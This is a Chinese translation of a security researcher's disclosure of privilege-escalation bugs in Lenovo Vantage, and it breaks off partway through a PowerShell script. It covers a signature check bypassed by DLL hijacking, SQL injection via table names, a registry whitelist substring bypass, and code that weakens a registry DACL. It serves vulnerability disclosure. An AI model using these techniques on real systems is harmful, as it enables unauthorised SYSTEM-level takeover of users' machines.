---
title: 揭露 Lenovo Vantage 权限提升漏洞
url: https://mp.weixin.qq.com/s/v4UszwVZiBzu7XEX4CcWow
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:56:24.422974
---

# 揭露 Lenovo Vantage 权限提升漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h4gtbB74nSia5EB8frgbmHbxJ7sAMNJnJSKnV0ZrlNOKvTG1QsLNQpcAiakIegiaQe3C3vvPJ89oibBotEJmpdBjDwtibVY3kNt23ffeazHqpQ7s/0?wx_fmt=jpeg)

# 揭露 Lenovo Vantage 权限提升漏洞

Bryan Alexander
Bryan Alexander

securitainment

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

| 原文链接 | 作者 |
| --- | --- |
| https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage | Bryan Alexander |

这篇文章详细介绍了 Atredis 在 Lenovo Vantage 中发现的多个权限提升漏洞。Lenovo Vantage 是 Lenovo 笔记本电脑预装的常见管理平台。文章将深入分析 Vantage 的架构，以及架构设计对所识别逻辑漏洞的影响范围与缓解措施的意义。以下 CVE 编号用于追踪上述问题：

* CVE-2025-6230
* CVE-2025-6231
* CVE-2025-6232

相关补丁已于 7 月 8 日发布，修复了全部发现的漏洞 ( LEN-196648 )。文末附有完整的漏洞披露时间表。

## Lenovo Vantage

### 架构

Lenovo Vantage 预装于联想笔记本电脑，提供设备固件更新、参数配置及系统健康维护等功能。其整体设计遵循模块化与可插拔原则：核心 Vantage 服务以 SYSTEM 权限持续运行，各插件按需动态加载与卸载。所有组件均以 C# 编写，这使得逆向工程的难度大幅降低——MSIL (Microsoft Intermediate Language) 具备良好的伪代码可恢复性，分析人员可高效还原源码逻辑。下图展示了其整体架构：

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShCn23Xvx3wzibRlrNia61wk1jEDn0Tx2kGscMAY9K5TblruUBhOIprbZBzm5V4uTw2AbqcUoO5IPuABXWhs2piaicdUrz05UtK4yc/640?wx_fmt=png&from=appmsg)

Vantage 服务启动一个 RPC 端点，供插件和 GUI 客户端连接并提交请求。值得注意的是，插件本身同样对外暴露 RPC 端点，并通过 RPC 与 Vantage 服务进行双向通信。请求报文采用 JSON 格式，结构如下：

```
{
"contract"    : "Target",
"command"     : "Command",
"payload"     : "EncodedPayload",
"targetAddin" : "Unused",
"clientId"    : "12",
"CallerPid"   : 12
}
```

在实际分析中，我们观察到 Vantage 全程仅使用了前三个字段。

Vantage 服务负责将请求路由至已注册的插件。各插件通过位于 `%ProgramData%\Lenovo\Vantage\Addins`目录下各自根文件夹中的 XML 文件进行描述。以 `SmartInteractAddin`为例，它对外暴露三个合约：

```
<Contracts>
    <Contract name="SystemManagement.SmartGesture" />
    <Contract name="SystemManagement.PrecisionTouchPad" />
    <Contract name="SystemManagement.VisionProtection" />
  </Contracts>
```

除合约定义外，插件 XML 文件还包含其他运行时配置，例如事件订阅与签名块。`SmartInteractAddin`的配置如下：

```
<Addin name="SmartInteractAddin" version="1.0.3.64" isRollback="false" secondaryServer="false" noSWFlags="false" armReady="false" platform="MSIL" runas="user">
```

其中，`runas`字段指定了插件的执行上下文。在 Vantage 支持的约 20 个插件中，有 5 个配置为在提升权限的上下文中运行。

客户端向 Vantage 服务及其注册插件发起请求时，必须通过信任验证。Vantage 服务内置了一套基础身份验证机制，其执行流程如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgeiauIhHs8wrr2ib5JfPficoEV8TfSicMj4CF6VqJG36950OUm7CL91To5h8l9icrgtT8gBpbC0fdr0ug6lSMdU6mqqJCslBQRhm6E/640?wx_fmt=png&from=appmsg)

核心验证步骤是对客户端进程的数字签名进行校验。若程序集未由联想签名，则该客户端被判定为不受信任，请求随即被拒绝。这一策略被众多笔记本电脑厂商和软件供应商广泛采用，包括 Dell、Asus 和 Symantec，然而绕过该机制极为简单。我们迅速整理出三种可行方案：

1. 利用常见的远程进程注入技术 (如 `CreateRemoteThread`)
2. 定位某个从本地路径加载 DLL 的已签名联想二进制文件，执行 DLL 劫持
3. 开发一个 UWP 应用

经过评估，第二种方案最为简便。我们最终选用 `FnhotkeyWidget.exe`作为切入点，以获取对 RPC 端点的访问权限。该二进制文件会从本地路径加载若干 DLL，因此可通过将其复制到可写目录来实施劫持。随后，我们在该二进制文件的本地路径中放置一个名为 `profapi.dll`的 DLL，执行后即可在已签名二进制进程内获得代码执行能力。

### 发送请求

由于每个插件通过 RPC 与 Vantage 服务通信，Lenovo 开发了一个标准 RPC 客户端，以统一方式支持所有客户端调用。`Lenovo.Vantage.RpcClient.dll`是一个 C# DLL，封装了通用通信例程，并对不同架构提供透明支持。向 Vantage RPC 端点发送请求的用法如下：

```
Dictionary<string, string>DiskSpaceRequest=newDictionary<string, string>()
{
    { "contract", "SystemOptimization.SystemUpdate" },
    { "command", "Get-FreeDiskSpace" },
};
stringrequestStr=JsonConvert.SerializeObject(DiskSpaceRequest);

RpcClientclient=newRpcClient();
stringtext=client.MakeRequest(requestStr, delegate(stringresponse)
{
    return Lenovo.Vantage.RpcCommon.RpcCallbackResult.Ok;
});
```

通过上述方式，可以访问 Vantage RPC 端点及其已注册的插件接口。

研究初期，我们首先对在提升权限上下文中运行的插件进行了合约枚举。在 20 个插件中，有 5 个以 SYSTEM 权限运行：CommercialAddin、LenovoAuthenticationAddin、LenovoHardwareScanAddin、LenovoSystemUpdateAddin 和 VantageCoreAddin。其中 VantageCoreAddin 是核心服务插件，随 Lenovo Vantage 持续运行，提供多种基础系统功能服务。我们以此为切入点展开分析，发现了两处问题。

## CVE-2025-6230

Atredis 发现的第一批漏洞位于 Vantage 服务的核心例程中。尽管几乎所有功能和请求处理器均通过插件实现，Vantage 本身仍存在若干核心合约。

其中一个合约位于 `VantageCoreAddin`，负责处理主机上的基础功能，包括获取系统信息、发起蓝牙扫描以及更新插件设置数据库。其中一条支持的命令 `Lenovo.Vantage.AddinSetting`用于配置本地 Vantage 设置。这些设置存储在 `C:\ProgramData\Lenovo\Vantage\Settings\LocalSettings.db`的 SQLite 数据库中，仅 SYSTEM 账户可访问。

处理 `DeleteTable`命令时，`payload`中应包含一个 JSON 数据包，携带待删除的表名，服务随后将该表从数据库中清除：

```
using (SQLiteCommand sqliteCommand = LocalSettingsDb._dbConnection.CreateCommand())
{
string commandText = string.Format("drop table {0}", localSetting.Component) ?? "";
    sqliteCommand.CommandText = commandText;
    sqliteCommand.ExecuteNonQuery();
}
```

与读写函数不同，此处对 `localSetting.Component`字段未执行任何清理操作，任意内容均可拼接至 SQL 查询。此外，尽管 SQLite 默认不支持堆叠查询，所使用的 .NET 库 (官方 SQLite 库) 却支持该特性，攻击者因此可执行任意数量的 SQL 查询。

`DeleteSetting`处理器中存在第二处 SQL 注入：

```
using SQLiteCommand sQLiteCommand = _dbConnection.CreateCommand();
string commandText = $"delete from {localSetting.Component} where Key=@key and UserName=@username" ?? "";
sQLiteCommand.Parameters.Add("@key", DbType.String).Value = localSetting.Key;
sQLiteCommand.Parameters.Add("@username", DbType.String).Value = localSetting.UserName;
sQLiteCommand.CommandText = commandText;
sQLiteCommand.ExecuteNonQuery();
```

其中 `key`与 `username`字段已正确参数化，但 `localSetting.Component`字段未经清理或参数化，导致 SQL 注入。

利用上述漏洞存在一定难度：尽管可通过堆叠查询传递任意 SQL，但用户定义函数 (UDF) 与扩展默认处于禁用状态，无法直接通过这些途径执行代码。攻击者可创建任意文件名的文件并影响其内容，但无法构造格式合规的文件。

## CVE-2025-6232

Atredis 发现的第三个漏洞更具研究价值。问题同样出在上述 Vantage 服务中，但触发点转移到了 `Set-KeyChildren`命令——该命令负责更新 `HKCU\SOFTWARE\Lenovo`下的用户注册表配置。服务中还存在配套的 `Get-KeyChildren`命令，但后者对注册表路径没有限制。传入请求首先被反序列化为 `KeyChildrenRequest`对象，结构大致如下：

```
KeyChildrenRequest keyChildrenRequest =new KeyChildrenRequest
{
KeyList=newKeyList[]
    {
new KeyList
        {
Location=@"HKCU\SOFTWARE\Lenovo\Test",
KeyChildren=newKeyChild[]
            {
new KeyChild
                {
Type=RegistryKind.String,
Name="Test",
Value="Hello!"
                }
            }
        }
    }
};
```

上述请求会在 `HKCU\SOFTWARE\Lenovo\Test`下写入字符串值 `Test`。在执行注册表写入前，`VantageCoreAddin`会先对 `Location`字段做白名单校验：

```
privatestaticreadonlyIEnumerable<string>WhiteList=newList<string> { "HKCU\\SOFTWARE\\Lenovo" };
...
KeyList[] keyList=keyChildrenRequest.KeyList;
foreach (KeyListkeyinkeyList)
{
try
    {
if (WhiteList.Any((stringf) =>key.Location.IndexOf(f, StringComparison.OrdinalIgnoreCase) >=0))
        {
KeyChild[] keyChildren=key.KeyChildren;
foreach (KeyChildkeyChildinkeyChildren)
            {
RegistryQuery.WriteValue(key.Location, keyChild.Name, keyChild.Value, view64: true,
                                                           (RegistryValueType)keyChild.Type);
            }
        }
    }
...
```

然而，该校验仅通过 `IndexOf(..) >= 0`判断白名单字符串是否出现在路径中，并未验证路径是否真正位于该位置之下。以下路径即可绕过校验：

```
HKLM\SOFTWARE\Lenovo\HKCU\SOFTWARE\Lenovo
```

由于白名单字符串作为子串存在于完整路径中，写入操作得以通过校验。通常情况下，非特权用户无法访问 HKLM 配置单元，因为对其的写入可能直接危及主机安全。但研究过程中，我们发现若干 Lenovo 专属键值对普通桌面用户开放了写权限：

```
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Battery1
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\ExtremeBatteryLife
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Gadget
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Log
```

上述四个键均由本地用户持有所有权，因此可被任意写入和修改：

```
RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : a-pdx1\bja
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None
```

需要指出，HKLM 下还存在其他对普通用户可写的键值，此处选用 Lenovo 路径主要是出于可移植性考虑。另外，由于 Microsoft 引入了一项安全缓解措施，禁止从非特权配置单元向特权配置单元创建符号链接，HKCU 到 HKLM 的直接符号链接无法建立 (详见此处) 。

要完成漏洞利用，攻击者首先需要修改目标键值的 DACL，使其支持子键权限继承。在默认状态下，虽然 `bja`用户持有该键值的所有权并可创建子键，但子键不会继承父键权限 (参见上方 `InheritanceFlags`) 。这一步是后续利用的前提条件。可通过以下 PowerShell 脚本为所有者重建一个携带可继承权限的 DACL：

```
$regPath="HKLM:\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Battery1"
$identity="a-pdx1\bja"

$acl=Get-Acl-Path$regPath
$existingRights=$null
foreach ($rulein$acl.Access) {
if ($rule.IdentityReference-eq$identity) {
$existingRights=$rule.RegistryRights
break
    }
}

$inheritanceFlags= [System.Security.AccessControl.InheritanceFlags]::ContainerInherit
$propagationFlags= [System.Security.AccessControl.PropagationFlags]::None
$accessRule=New-ObjectSystem.Security.AccessControl.RegistryAccessRule(
$identity,
$existingRights,
$inheritanceFlags,
$propagationFlags,
    [System.Sec...